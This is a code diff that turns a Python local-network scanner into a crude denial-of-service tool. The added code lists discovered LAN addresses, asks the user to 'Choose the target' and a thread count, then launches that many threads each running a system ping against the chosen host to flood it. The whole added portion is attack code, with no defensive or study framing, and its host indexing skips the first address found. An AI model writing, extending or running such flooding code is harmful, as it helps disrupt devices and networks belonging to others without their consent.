@@ -2,8 +2,7 @@ import os
 import socket    
 import multiprocessing
 import subprocess
-import os
-
+import threading
 
 def pinger(job_q, results_q):
     """
@@ -88,4 +87,124 @@ if __name__ == '__main__':
     print('\nScanning...\n')
     print('0%')
     lst = map_network()
-    print(lst)
+    colv = len(lst)
+    print('\n  Found {} Local IP'.format(colv))
+    print()
+    if colv > 1:
+        ip1 = str(lst[1])
+        print('  1. ' + ip1)
+    if colv > 2:
+        ip2 = str(lst[2])
+        print('  2. ' + ip2)
+    if colv > 3:
+        ip3 = str(lst[3])
+        print('  3. ' + ip3)
+    if colv > 4:
+        ip4 = str(lst[4])
+        print('  4. ' + ip4)
+    if colv > 5:
+        ip5 = str(lst[5])
+        print('  5. ' + ip5)
+    if colv > 6:
+        ip6 = str(lst[6])
+        print('  6. ' + ip6)
+    if colv > 7:
+        ip7 = str(lst[7])
+        print('  7. ' + ip7)
+    if colv > 8:
+        ip8 = str(lst[8])
+        print('  8. ' + ip8)
+    if colv > 9:
+        ip9 = str(lst[9])
+        print('  9. ' + ip9)
+    if colv > 10:
+        ip10 = str(lst[10])
+        print('  10. ' + ip10)
+
+    ddos_to = int(input('\n  Choose the target: '))
+    NUM = input('\n  Number of threading: ')
+    print('')
+
+    def tar1():
+        os.system('ping ' + ip1)
+    def tar2():
+        os.system('ping ' + ip2)
+    def tar3():
+        os.system('ping ' + ip3)
+    def tar4():
+        os.system('ping ' + ip4)
+    def tar5():
+        os.system('ping ' + ip5)
+    def tar6():
+        os.system('ping ' + ip6)
+    def tar7():
+        os.system('ping ' + ip7)
+    def tar8():
+        os.system('ping ' + ip8)
+    def tar9():
+        os.system('ping ' + ip9)
+    def tar10():
+        os.system('ping ' + ip10)
+
+    if ddos_to == 1:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar1)
+            t.start()
+            value += 1
+    if ddos_to == 2:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar2)
+            t.start()
+            value += 1
+    if ddos_to == 3:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar3)
+            t.start()
+            value += 1
+    if ddos_to == 4:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar4)
+            t.start()
+            value += 1
+    if ddos_to == 5:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar5)
+            t.start()
+            value += 1
+    if ddos_to == 6:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar6)
+            t.start()
+            value += 1
+    if ddos_to == 7:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar7)
+            t.start()
+            value += 1
+    if ddos_to == 8:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar8)
+            t.start()
+            value += 1
+    if ddos_to == 9:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar9)
+            t.start()
+            value += 1
+    if ddos_to == 10:
+        value = 0
+        for value in range(int(NUM)):
+            t = threading.Thread(target=tar10)
+            t.start()
+            value += 1
+
+    
